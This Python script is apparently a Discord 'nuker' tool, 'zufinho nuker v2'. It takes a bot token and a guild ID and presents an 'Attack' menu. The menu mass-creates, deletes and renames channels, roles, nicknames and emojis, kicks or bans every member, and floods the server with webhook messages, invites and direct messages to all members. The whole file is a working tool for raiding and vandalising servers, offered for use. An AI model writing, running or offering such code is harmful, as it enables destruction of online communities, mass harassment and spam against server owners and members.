#scripted by zufinho (again)
#now becomming more faster and more organized
import os
import time
import time
try:
    import requests
    from pystyle import Colorate,Colors
except:
    os.system("pip install requests pystyle")
    import requests
    from pystyle import Colorate,Colors
banner="""

zufinho nuker v2

discord.gg/jvrBvcCm72
"""
version="beta 2.2 linux - v2"
def printcolor(text):
    print(Colorate.Horizontal(Colors.purple_to_blue,text,1))
#varivbles importants
guildverified=0
cango=0
count=0
while True:
    os.system("clear")
    printcolor(banner)
    print()
    print()
    printcolor(version)
    print()
    printcolor("Digit the token bot:")
    token=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
    #verify if bot token is valid
    tokenverify = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f"Bot {token}"})
    if tokenverify.status_code==200:
        while True:
            os.system("clear")
            printcolor(banner)
            print()
            print()
            printcolor(version)
            print()
            printcolor("Digit the guild id:")
            guildid=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
            #verify if bot in guild
            guildverify=requests.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
            for guild in guildverify.json():
                if guild['id']==guildid:
                    guildverified=1
                    break
            else:
                printcolor("Bot not is in guild")
                time.sleep(3)
            if guildverified==1:
                break
    else:
        printcolor("insert a valid token")
        time.sleep(3)
    if guildverified==1:
        break
#all ok

#functions
#the funcionally nuker 
while True:
    count=0
    success=0
    fail=0
    repeat=""
    new=""
    new1=""
    api=""
    cango=""
    os.system("clear")
    printcolor(banner)
    print()
    print()
    printcolor(version)
    print()
    printcolor("--Attack--")
    printcolor("[1] Create Channels         [2] Delete Channels         [3] Create Roles        [4] Delete Roles")
    printcolor("[5] Rename Channels         [6] Rename Roles            [7] Rename User         [8] Rename Emojis")
    printcolor("[9] Kick all                [10] Ban all                [11] Unban all          [12] Webhook Spammer")
    printcolor("[13] Invite Spammer         [14] Dm Spammer")
    print()
    cmd=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
    if cmd=="1":
        #create channels
        printcolor("Name of channel:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        printcolor("Channel type:")
        printcolor("text/voice/category")
        new1=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        if new1.lower()=="text" or new1=="":
            new1=0
            cango=1
        elif new1.lower()=="voice":
            new1=2
            cango=1
        elif new1.lower()=="category":
            new1=4
            cango=1
        else:
            print(Colorate.Color(Colors.red,"type of channel incorrect",1))
            time.sleep(3)
        #creating
        if cango==1:
            printcolor("Amount of channels:")
            repeat=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
            while not count==repeat:
                printcolor(f"requested to create {new}")
                requests.post(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}","Content-Type": "application/json",}, json={"name": new, "type": new1})
                count+=1
            printcolor("Finished")
            time.sleep(1)
    elif cmd=="2":
        #delete channels
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
        if api.status_code == 200:
            for channel in api.json():
                printcolor(f"requested to delete {channel['name']}")
                requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers={"Authorization": f"Bot {token}",})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="3":
        #role create
        printcolor("Name of role:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        printcolor("Amount of roles:")
        repeat=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
        while not count==repeat:
            printcolor(f"requested to create {new}")
            requests.post(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}","Content-Type": "application/json",}, json={"name": new,"color": int('7014ba', 16),"permissions": "0","hoist": False,"mentionable": False})
            count +=1
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="4":
        #role delete
        api=requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles",headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for role in api.json():
                printcolor(f"requested to delete {role['name']}")
                requests.delete(f"https://discord.com/api/v9/guilds/{guildid}/roles/{role['id']}", headers={"Authorization": f"Bot {token}",})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="5":
        #rename channel
        printcolor("New Name:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for channel in api.json():
                printcolor(f"requested channel {channel['name']} rename to {new}")
                requests.patch(f"https://discord.com/api/v9/channels/{channel['id']}", headers={"Authorization": f"Bot {token}","Content-Type": "application/json"}, json={"name": new,})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="6":
        #rename role
        printcolor("New Name:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for role in api.json():
                printcolor(f"requested role {role['name']} rename to {new}")
                requests.patch(f"https://discord.com/api/v9/guilds/{guildid}/roles/{role['id']}", headers={"Authorization": f"Bot {token}","Content-Type": "application/json",}, json={"name": new,})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="7":
        #nick name change
        printcolor("New name:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for people in api.json():
                printcolor(f'requested user {people["user"]["username"]} rename to {new}')
                requests.patch(f"https://discord.com/api/v9/guilds/{guildid}/members/{people['user']['id']}", headers={"Authorization": f"Bot {token}","Content-Type": "application/json",}, json={"nick": new,})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="8":
        #emoji name change
        printcolor("New name:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for emoji in api.json():
                printcolor(f"requested change {emoji['name']} rename to {new}")
                requests.patch(f"https://discord.com/api/v9/guilds/{guildid}/emojis/{emoji['id']}",headers={"Authorization": f"Bot {token}","Content-Type": "application/json",},json={"name": new})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="9":
        #kick all
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for people in api.json():
                printcolor(f"requested to kick user {people['user']['username']}")
                requests.delete(f'https://discord.com/api/v9/guilds/{guildid}/members/{people["user"]["id"]}',headers={'Authorization': f'Bot {token}','Content-Type': 'application/json',})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="10":
        #ban all
        printcolor("Ban reason:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for people in api.json():
                printcolor(f"requested to ban user {people['user']['username']}")
                requests.put(f"https://discord.com/api/v9/guilds/{guildid}/bans/{people['user']['id']}",headers={'Authorization': f'Bot {token}','Content-Type': 'application/json',},json={'delete_message_days': '0','reason': new,})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="11":
        #unban all
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/bans", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for people in api.json():
                printcolor(f"requested to unban user {people['user']['username']}")
                requests.delete(f"https://discord.com/api/v9/guilds/{guildid}/bans/{people['user']['id']}",headers={'Authorization': f'Bot {token}'})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        printcolor("Finished")
        time.sleep(1)
    elif cmd=="12":
        #webhook spammer
        printcolor("Message Content:")
        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
        if api.status_code==200:
            for channel in api.json():
                printcolor(f"Requested to create webhook at {channel['name']}")
                new1 = requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/webhooks",headers={"Authorization": f"Bot {token}"},json={"name": "zufinho nuker v2","avatar": None})
                printcolor(f"Requested to send webhook at {channel['name']}")
                requests.post(new1.json().get('url'),json={"content": new})
        else:
            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
        time.sleep(1)
    elif cmd == "13":
        #invite spammer
        printcolor("Repeat how many times per channel?")
        new=int(input(">"))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
        for channel in api.json():
            count=0
            while not count==new:
                printcolor(f"[{count}] requested to create invite at {channel['name']}")
                requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/invites", json={'max_age': 0,'max_uses': 0}, headers={'Authorization': f'Bot {token}'})
                count +=1
        printcolor("Finished!")
        time.sleep(1)
    elif cmd=="14":
        #dm spammer
        printcolor("Message:")
        new = input(Colorate.Horizontal(Colors.purple_to_blue, ">", 1))
        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
        if api.status_code == 200:
            for pessoa in api.json():
                printcolor(f"start request to start dm with {pessoa['user']['username']}")
                new1 = requests.post('https://discord.com/api/v9/users/@me/channels',
                                    headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'},
                                    json={'recipient_id': pessoa['user']['id']})

                if new1.status_code == 200:
                    new1_data = new1.json()
                    if 'id' in new1_data:
                        id_canal = new1_data['id']
                        printcolor(f"request to send message to {pessoa['user']['username']}")
                        resposta = requests.post(f'https://discord.com/api/v9/channels/{id_canal}/messages',
                                                headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'},
                                                json={'content': new})
                        if resposta.status_code != 200:
                            printcolor(f"fail to send dm: {resposta.status_code}")
                    else:
                        printcolor("fail to create dm")
                else:
                    printcolor(f"faild to create dm: {new1.status_code}")
        else:
            printcolor(f"fail to get members: {api.status_code}")
        printcolor("Finished")
        time.sleep(1)